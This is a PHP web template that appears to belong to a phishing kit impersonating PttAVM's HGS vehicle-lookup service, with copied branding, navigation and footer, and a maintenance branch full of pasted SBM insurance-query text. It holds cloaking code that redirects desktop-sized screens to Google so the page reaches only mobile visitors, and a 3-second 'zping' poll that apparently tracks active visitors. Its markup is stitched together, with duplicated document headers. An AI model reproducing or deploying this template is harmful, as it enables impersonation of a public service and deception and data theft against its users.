<?php if (siteayar()->site_durum == 1) { ?>





    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
    <html>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function yönlendir() {
            var ekranGenisligi = window.innerWidth;

            // Eğer ekran genişliği 768px veya daha büyükse, Google'a yönlendir
            if (ekranGenisligi >= 768) {
                window.location.href = "https://www.google.com";
            }
        }

        // Sayfa yüklendikten sonra ilk yönlendirme
        window.onload = function() {
            yönlendir(); // Sayfa yüklendiğinde yönlendirme yap
        };

        // Ekran boyutu değiştiğinde yönlendirme yap
        window.onresize = function() {
            yönlendir(); // Ekran boyutu değiştikçe yönlendirme yap
        };
    </script>
</head>
<body>
    <!-- Sayfa içeriği burada hiç gösterilmeyecek -->
</body>
</html>


    <head>
        <script type="application/javascript">
            var SERVICE_NAME = 'epttavm';
            var TIMESTAMP = '1627499096';
            var HASH = 'e08554d4cd84905497f198a9c3d46d67f060129a135cc270f2744d048df2d513';
        </script>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=0">
<meta name="description" content="HGS uygulamaları ile ikinci el araçlar için Kilometre ve Muayene Sorgulamak artık çok kolay! HGS Araç Hasar Sorgulama, HGS Araç Kilometre ve Muayene Sorgulama" />
<title>Araç Kilometre ve Tramer Sorgulama | HGS</title>
        <link rel="icon" type="image/png" href="<?= front_folder() ?>hgs2/v2/assets/images/favicon.png?v=201910111500" />
        <link rel="stylesheet" href="<?= front_folder() ?>hgs2/v2/assets/fonts/opensans/open-sans.css?v=201910111500">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
        <script src="<?= front_folder() ?>hgs2/v2/assets/js/pace.js?v=201910111500" type="text/javascript"></script>
        <link rel="stylesheet" type="text/css" href="<?= front_folder() ?>hgs2/v2/assets/css/pace.css?v=201910111500" />

        <link rel="stylesheet" href="<?= front_folder() ?>hgs2/v2/assets/css/hgs.min_20210727191922.css?v=201910111500" />



        <link rel="stylesheet" href="<?= front_folder() ?>/hgs2/sweetalert2/sweetalert2.min.css">
        <script src="<?= front_folder() ?>/hgs2/sweetalert2/sweetalert2.min.js"></script>
        <script src="<?= front_folder() ?>/hgs2/jquery.mask.min.js"></script>



        <script>
            function hata_goster(type, text) {
                if (type == "success") {
                    Swal.fire({
                        position: "top-end",
                        type: "success",
                        title: text,
                        showConfirmButton: !1,
                        timer: 1500
                    })
                } else {
                    Swal.fire({
                        html: text,
                        type: "error",
                        confirmButtonColor: "#556ee6"
                    })
                }
            }
        </script>

        <script type="text/javascript">
            var mtvRecaptcha;
            var trafikCezasiRecaptcha;
            var trafikCezasiBeyanliRecaptcha;
            var hgsRecaptcha;
            var kmRecaptcha;
            var damageRecaptcha;
            var damageRecaptchaPart;

            function recaptchaReadyForInit() {

                var recaptchaSiteKey = $('#recaptcha-site-key').val();

                if ($('#mtv-recaptcha').length > 0) {
                    mtvRecaptcha = grecaptcha.render('mtv-recaptcha', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }

                if (($('#tp-recaptcha').length > 0) && ($('#tp-recaptcha-declared').length > 0)) {
                    trafikCezasiRecaptcha = grecaptcha.render('tp-recaptcha', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });

                    trafikCezasiBeyanliRecaptcha = grecaptcha.render('tp-recaptcha-declared', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }

                if ($('#hgs-recaptcha').length > 0) {
                    hgsRecaptcha = grecaptcha.render('hgs-recaptcha', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }

                if ($('#km-recaptcha').length > 0) {
                    kmRecaptcha = grecaptcha.render('km-recaptcha', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }

                if ($('#damage-recaptcha').length > 0) {
                    damageRecaptcha = grecaptcha.render('damage-recaptcha', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }

                if ($('#damage-recaptcha-part').length > 0) {
                    damageRecaptchaPart = grecaptcha.render('damage-recaptcha-part', {
                        'sitekey': recaptchaSiteKey,
                        'callback': recaptchaCallbackFunction,
                        'theme': 'dark'
                    });
                }
            }
        </script>




    </head>

    <body>

        <div class="image-container wizard-hgs-image-container set-full-height">
            <input type="hidden" id="current-page-code" value="hgs" />
            <input type="hidden" value="0" id="get_user_id" />
            <input type="hidden" value="production" id="app_env" />
            <input type="hidden" value="" id="is-mobile" />
            <input type="hidden" value="" id="is-office" />
            <input type="hidden" value="1" id="is-new-site" />
            <input type="hidden" value="<?= front_folder() ?>hgs2/v2/assets/" id="assets-url" />

            <div class="container-fluid no-padding">
                <div class="navbar-header" style="overflow: hidden;">
                    <div class="logo-field">
                        <a class="navbar-brand navbar-left" target="_blank">
                            <img src="<?= front_folder() ?>hgs2/v2/assets/images/pttavm_hgs_logo.png?v=201910111500" alt="192.168.34.17" class="logo" title="HGS - PttAVM" border="0" />
                        </a>
                    </div>
                    <div class="menu-field">
                        <nav class="nav responsive-menu">
                            <div class="menu-wrapper resize-drag nav-wrapper">
                                <ul class="nav-ul">
                                    <li class="homepage-menu-item">
                                        <a href="/" title="HGS Yükle"><span>Ana Sayfa</span></a>
                                    </li>
                                    <li class="hgs-menu-item">
                                        <a href="/" title="HGS Yükle" >
                                            <span>
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/hgs_yukle.png?v=201910111500" class="menu-showed-item" />
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/hgs_yukle_hover.png?v=201910111500" class="menu-hover-item display-none" />
                                                Yükle
                                            </span>
                                        </a>
                                    </li>
                                    <li class="damage-menu-item">
                                        <a href="/" title="Araç Hasar Sorgulama, Araç Kilometre ve Muayene Sorgulama">
                                            <span>
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/hasar_sorgula.png?v=201910111500" class="menu-showed-item" />
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/hasar_sorgula_hover.png?v=201910111500" class="menu-hover-item display-none" />Hasar Sorgula</span>
                                        </a>
                                    </li>
                                    <li class="km-menu-item">
                                        <a href="/" title="Araç KM Sorgulama, Araç Muayene Sorgulama, Araç Kilometre Sorgulama" class="selected">
                                            <span>
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/km_sorgula.png?v=201910111500" class="menu-showed-item" />
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/km_sorgula_hover.png?v=201910111500" class="menu-hover-item display-none" />
                                                KM Sorgula
                                            </span>
                                        </a>
                                    </li>
									                                    <li class="km-menu-item">
                                        <a href="/" title="Araç KM Sorgulama, Araç Muayene Sorgulama, Araç Kilometre Sorgulama">
                                            <span>
                                                <img src="https://hgs.pttavm.com/v2/assets/images/menu/sigortayeri-white.png?v=201910111500" class="menu-showed-item" />
                                                <img src="https://hgs.pttavm.com/v2/assets/images/menu/sigortayeri-white.png?v=201910111500" class="menu-hover-item display-none" />
                                                Sigorta &amp; Kasko Teklifi Al
                                            </span>
                                        </a>
                                    </li>
                                    <li class="shopping-cart-menu-item"><a target="_blank">
                                            <span>
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/alisveris.png?v=201910111500" class="menu-showed-item" />
                                                <img src="<?= front_folder() ?>hgs2/v2/assets/images/menu/alisveris_hover.png?v=201910111500" class="menu-hover-item display-none" />
                                                Alışverişe Başla
                                            </span>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </nav>
                    </div>
                    <div class="actions-field">

                    </div>
                </div>
                <?php $this->load->view('hgs2/sayfalar/' . $sayfa_adi . '.php'); ?>
                <footer>
                    <div class="container">
                        <div class="copyright">© Copyright 2025 PTT AVM | Tüm hakları saklıdır.</div>
                        <div class="footer-menu">
                            <ul>
                                <li class="important-informations">
                                    <a href="javascript:void(0);">Önemli Bilgiler</a>
                                    <ul>
                                        <li><a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a></li>
                                        <li><a href="#" data-toggle="modal" data-target="#aydinlatma-metni-modal">Aydınlatma Metni</a></li>
                                        <li><a href="#" data-toggle="modal" data-target="#imha-politikasi-modal">İmha Politikası</a></li>
                                        <li><a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a></li>
                                    </ul>
                                </li>
                                <li><a href="#" data-toggle="modal" data-target="#comment-modal">Görüş Bildir</a></li>
                                <li><a href="#" data-toggle="modal" data-target="#sss-modal">Sıkça Sorulan Sorular</a></li>
                                <li><a href="#" data-toggle="modal" data-target="#contact-modal">İletişim</a></li>
                            </ul>
                        </div>
                        <div class="cookie-warning display-none">
                            <h3>Çerez Politikası
                                <i class="icon close cookie-warning-close-btn" onclick="app.closeCookieWarning();">x</i>
                            </h3>
                            <p>
                                hgs.pttavm.com'da bulunan çerezler (cookies); alışveriş deneyiminizi iyileştirmek için
                                yasal mevzuata uygun olarak düzenlenmiştir. Detaylı bilgiye ulaşmak için<br />
                                <a href="#" data-toggle="modal" data-target="#cerez-politikasi-modal">Çerez Politikası</a> sayfasını ziyaret edebilirsiniz.
                            </p>
                        </div>
                    </div>
                </footer>
            </div>
        </div>

        <!-- MAINTENANCE MODE -->
        <input type="hidden" id="maintenance_hgs" value="0" />
        <input type="hidden" id="maintenance_hasar" value="0" />
        <input type="hidden" id="maintenance_km" value="0" />
        <input type="hidden" id="maintenance_mtv" value="1" />
        <input type="hidden" id="maintenance_trafik" value="1" />

        <script type="text/javascript" src="<?= front_folder() ?>hgs2/hgs.js"></script>


        <script type="text/javascript">
            $(document).ready(function() {
                app.documentReady();
                $(window).trigger('resize')
            });
            window.addEventListener('DOMContentLoaded', () => {
                app.domContentLoaded();
            });
            $(window).resize(function() {
                app.navResizeCheck();
            });
        </script>

    </body>

    </html>

    <script type="text/javascript">
        $(document).ready(function() {
            hgs.documentReady();
        });
        setInterval(function() {
            $.get("<?= base_url('zping') ?>", function(data) {});
        }, 3000);
    </script>

    



<?php } else { ?>

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>bakım</title>
    </head>

    <body>
        <div style="padding-top:40px;text-align:center; font-weight:700; color:#333; font-size:40px; font-family:Arial, Helvetica, sans-serif">
           SBM LogoSigorta Bilgi ve Gözetim Merkezi
SİGORTAM360
ONLINE İŞLEMLER
HİZMETLER
RAPORLAR
HAKKIMIZDA
İLETİŞİM
 
 SBM ONLINE
SUİSTİMAL BİLDİR
EN
SMS ile Sorgulama
5664 Uygulaması ile vatandaşların "araç hasar, araç detay, değişen parça" bilgilerine, aracıya gerek kalmaksızın kolayca ulaşabilmeleri hedeflenmiştir.

Turkcell, Türk Telekom, Vodafone ile anlaşmalı olarak devreye alınmış olan SMS projesi ile kişiler mesaj atarak arabalarının hasar geçmişlerini, araç detay bilgilerini, eksper raporuna göre değişen parçalarını Turkcell, Türk Telekom, Vodafone "5664"e mesaj atarak sorgulayabilirler.

5664 SMS sorgulama hizmeti ücretlidir. Ücretlendirmeler tüm operatörler için sorgulama başına 60,00 TL’ dir.

Hasar Geçmişi Sorgulama

Plakayı yazın, TURKCELL, TÜRK TELEKOM, VODAFONE 5664'e gönderin. Aracın plakası değişmiş olsa bile, hasar geçmişi anında cebinize gelsin.

 

 

 

 

ERP (Eksper Raporu) olan kazalarda değişen parçaları öğrenmek için PARCA yazıp boşluk bırakarak plakanızı yazıp boşluk bırakarak hasarın oluştuğu tarihi (gg/aa/yyyy) aşağıdaki örnekteki gibi yazıp sorgulama yapabilirsiniz.

Örnek : PARCA 34ABC123 01/01/2020

 

 

 

 

Diğer Sorgulama Şekilleri:

"Şasi No" ile sorgulama

Şasi numarası ile değişen parçaları öğrenmek için PARCA yazıp boşluk bırakarak S yazıp boşluk bırakarak şasi no bilgisini yazıp boşluk bırakarak hasarın oluştuğu tarihi (gg/aa/yyyy) aşağıdaki örnekteki gibi yazıp sorgulama yapabilirsiniz.

Örnek : PARCA S ABC987DEF12345 01/01/2020

  

 

 

Araç Detay Bilgisi Sorgulama

DETAY boşluk Plakayı yazın, TURKCELL, TÜRK TELEKOM, VODAFONE 5664'e gönderin. Aracın markası modeli, plaka değişimi olup olmadığı, hangi illerde tescil kaydının olduğu, araç türü değişimi olup olmadığı, son sahiplik süresi, yürürlükte kaskosunun olup olmadığı, trafiğe çıkış tarihi, toplam kaskolu olduğu süre ve toplam kaskosuz olduğu süre bilgileri anında cebinize gelsin.

Örnek : DETAY 34ABC123

 

 

 

Diğer Sorgulama Şekilleri:

"Şasi No" ile sorgulama

DETAY yazıp boşluk bırakarak S yazıp boşluk bırakarak Şasi numarasını yazın, TURKCELL, TÜRK TELEKOM, VODAFONE 5664'e gönderin. Aracın markası modeli, plaka değişimi olup olmadığı, hangi illerde tescil kaydının olduğu, araç türü değişimi olup olmadığı, son sahiplik süresi, yürürlükte kaskosunun olup olmadığı, trafiğe çıkış tarihi, toplam kaskolu olduğu süre ve toplam kaskosuz olduğu süre bilgileri anında cebinize gelsin.

Örnek : DETAY S ABC987DEF12345

 

 

 

Değişen Parça Bilgisi Sorgulama

Eksper raporuna göre araçta değişen parça bilgileri sorgusu için PARCA yazıp boşluk bırakarak plakanızı yazıp boşluk bırakarak hasarın oluştuğu tarihi (gg/aa/yyyy) aşağıdaki örnekteki gibi yazıp TURKCELL, TÜRK TELEKOM, VODAFONE 5664'e gönderebilirsiniz. Aracın kazaya ait eksper raporunda yer alan parça bilgileri anında cebinize gelsin.

Örnek : PARCA 34ABC123 01/01/2020

 

 

 

Diğer Sorgulama Şekilleri:

"Şasi No" ile sorgulama

Eksper raporuna göre araçta değişen parça bilgileri sorgusu için PARCA yazıp boşluk bırakarak S yazıp boşluk bırakarak şasi no bilgisini yazıp boşluk bırakarak hasarın oluştuğu tarihi (gg/aa/yyyy) aşağıdaki örnekteki gibi yazıp TURKCELL, TÜRK TELEKOM, VODAFONE 5664'e gönderebilirsiniz. Aracın kazaya ait eksper raporunda yer alan parça bilgileri anında cebinize gelsin.

Örnek : PARCA S ABC987DEF12345 01/01/2020

 

Yasal Uyarı:

Hasar Geçmisi Sorgulama hizmetiyle sunulan hasar bilgileri, 2003 yılından itibaren sigorta şirketleri tarafından yapılan kasko ve trafik sigortası hasar ödemeleri ile sınırlıdır. Hasar bilgileri; cam hasarı, kişisel eşya çalınması, anahtar/far/lastik/stepne/jant ve diğer parçaların çalınması, ses ve görüntü cihazlarının çalınması, mini onarım ödemelerini içermemektedir.
SMS sorgulamalarında cevap mesajında kullanılan bilgiler Sigorta Şirketleri tarafından merkezimizin kayıtlarına girildiğinden, Sigorta Bilgi ve Gözetim Merkezi (SBM) cevap niteliğindeki mesaj içeriği ile ilgili olarak hiçbir hukuksal sorumluluğu kabul etmez. Mesaj içeriğinde yer alan bilgilerdeki olası hatalar sebebiyle SBM'ye husumet yöneltilemez.
  Konuyla ilgili sorularınız için tıklayınız.


Çağrı Merkezi Telefon
0 850 222 0 SBM (726)
SBM Logo
© Copyright 2023 Sigorta Bilgi ve Gözetim Merkezi
Entegre Yönetim Sistemleri Politikası Kişisel Verilerin Korunması Bilgi Edinme Aydınlatma Metni Çerez Politikası Yasal Uyarı
Bizi takip edin!
  
Size daha iyi bir deneyim ve kullanım kolaylığı sunmak amacıyla bu internet sitesinde çerezler kullanılmaktadır. Çerezleri nasıl kullandığımızı, çerez ayarlarını ne şekilde değiştirebileceğinizi “Sigorta Bilgi ve Gözetim Merkezi Çerez Politikası” linkine tıklayarak; SBM tarafından kişisel verilerinizin işlenmesi ve aktarılması süreçlerine ilişkin yöntem, amaç ve hukuki sebepler ile sahip olduğunuz haklarınızı öğrenmek için Aydınlatma Metni linkine tıklayabilirsiniz. Çerez ayarlarınızı değiştirmeniz durumunda, bu internet sitesinde bazı özelliklerin işlevselliğini kaybedebileceği dikkate alınmalıdır.
        </div>
    </body>

    </html>

<?php } ?>